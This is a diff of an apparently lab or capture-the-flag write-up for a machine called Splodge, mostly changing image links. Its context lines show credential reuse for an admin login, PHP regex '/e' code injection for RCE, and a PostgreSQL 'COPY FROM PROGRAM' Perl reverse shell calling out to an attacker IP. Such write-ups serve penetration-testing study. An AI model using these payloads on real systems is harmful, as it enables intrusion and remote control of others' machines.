@@ -65,15 +65,15 @@ database/seeds/DatabaseSeeder.php:            'password' => 'SplodgeSplodgeSplod
 
 Port 80 just showed us a 403 page, which was not helpful. Port 1337 did show some potential for RCE:
 
-![](<../../../.gitbook/assets/image%20(2042).png>)
+![](../../../.gitbook/assets/splodge-2.png)
 
 However, I was unable to make anything happen. Port 8080 showed a blog page with an admin login:
 
-![](<../../../.gitbook/assets/image%20(3407).png>)
+![](../../../.gitbook/assets/splodge-6.png)
 
 We can login to the admin panel using `admin:SplodgeSplodgeSplodge`:
 
-![](<../../../.gitbook/assets/image%20(2708).png>)
+![](../../../.gitbook/assets/splodge-4.png)
 
 So now we know that the Git repository is for this application. This panel was rather interesting, because it has a 'Profanity Filter Regex' option, which I presume allows us to specify Regex strings within it.
 
@@ -101,15 +101,15 @@ Googling for PHP Regex exploits brings this up:
 
 From the article above, we can use regex of `/a/e` to inject PHP code. I tested this out:
 
-![](<../../../.gitbook/assets/image%20(3430).png>)
+![](../../../.gitbook/assets/splodge-7.png)
 
 Afterwards, I sent one comment with the letter 'a' in it. When I did, I got a hit on my HTTP server:
 
-![](<../../../.gitbook/assets/image%20(3400).png>)
+![](../../../.gitbook/assets/splodge-5.png)
 
 We now have RCE over the machine, and we can easily get a reverse shell on port 8080:
 
-![](<../../../.gitbook/assets/image%20(499).png>)
+![](../../../.gitbook/assets/splodge-9.png)
 
 ## Privilege Escalation
 
@@ -185,7 +185,7 @@ SELECT * FROM cmd_exec;
 DROP TABLE IF EXISTS cmd_exec;
 ```
 
-![](<../../../.gitbook/assets/image%20(1859).png>)
+![](../../../.gitbook/assets/splodge-1.png)
 
 We can just get another reverse shell using this:
 
@@ -193,7 +193,7 @@ We can just get another reverse shell using this:
 COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.196:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
 ```
 
-![](<../../../.gitbook/assets/image%20(2400).png>)
+![](../../../.gitbook/assets/splodge-3.png)
 
 The payload is taken from Hacktricks.
 
@@ -201,4 +201,4 @@ The payload is taken from Hacktricks.
 
 User can run `bash` as `root`:
 
-![](<../../../.gitbook/assets/image%20(494).png>)
+![](../../../.gitbook/assets/splodge-8.png)
